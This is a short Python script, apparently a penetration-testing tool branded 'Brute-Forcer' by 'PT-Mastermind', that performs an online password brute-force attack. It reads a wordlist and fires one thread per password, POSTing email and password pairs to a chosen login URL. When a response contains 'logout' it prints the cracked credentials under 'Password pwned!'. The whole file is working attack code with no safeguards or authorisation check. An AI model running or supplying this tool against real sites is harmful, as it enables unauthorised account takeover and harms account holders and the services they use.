import requests as r
import threading 
import argparse
import time
import json
import progressbar
import sys



def Banner():
    banner = """

  ____             _              ______                      
 |  _ \           | |            |  ____|                     
 | |_) |_ __ _   _| |_ ___ ______| |__ ___  _ __ ___ ___ _ __ 
 |  _ <| '__| | | | __/ _ \______|  __/ _ \| '__/ __/ _ \ '__|
 | |_) | |  | |_| | ||  __/      | | | (_) | | | (_|  __/ |   
 |____/|_|   \__,_|\__\___|      |_|  \___/|_|  \___\___|_|   
                                                              
                                                              

    """
    print(f"{banner}\n\t created by PT-Mastermind\n")
    print("___________________________________________")


def args():
    parser = argparse.ArgumentParser(description="python3 BruteForce.py -u <username> --wordlist <wordlist path>" + "| example: BruteForce.py -u bf@pt-mastermind.info -url https://for-example.com --wordlist wordlists/pass.txt")
    parser.add_argument("-u",help="user name \ email")
    parser.add_argument("-url",help="URL address")
    parser.add_argument("--wordlist",help="path to your wordlist")
    args = parser.parse_args()
    return args


def BruteForce(Password, username, Time, url):
    Target_url = url
    email = username
    Pdata = {'Email' : email, 'Password' : Password}
    response = r.post(Target_url, data=Pdata)
    rData = response.text
    if "logout" in rData:
        print("\nTime: %f seconds\n" % (time.time() - Time))
        print("[+]Password pwned!\n\n")
        print( "\t" + "User DATA")
        print("_____________________________")
        print(f"Email: {email}")
        print(f"Password: {Password}")
        sys.exit()
        
                
def main():
    start_time = time.time()
    Banner()
    i =  0
    args_result = args()
    with open(f'{args_result.wordlist}', 'r') as wordlist:
        threads = []
        num_lines = sum(1 for line in open(f'{args_result.wordlist}'))
        bar = progressbar.ProgressBar(maxval=num_lines, \
        widgets=[progressbar.Bar('=', '[', ']'), ' ', progressbar.Percentage()])
        bar.start()
        i = 0
        print(f"[+] Loadind Wordlist: {args_result.wordlist}\n") 
        for line in wordlist:
            i = 1+i
            bar.update(i)
            word = line.strip()
            t = threading.Thread(target=BruteForce, args=(word, args_result.u, start_time, args_result.url))
            threads.append(t)
            t.start() 

            

main()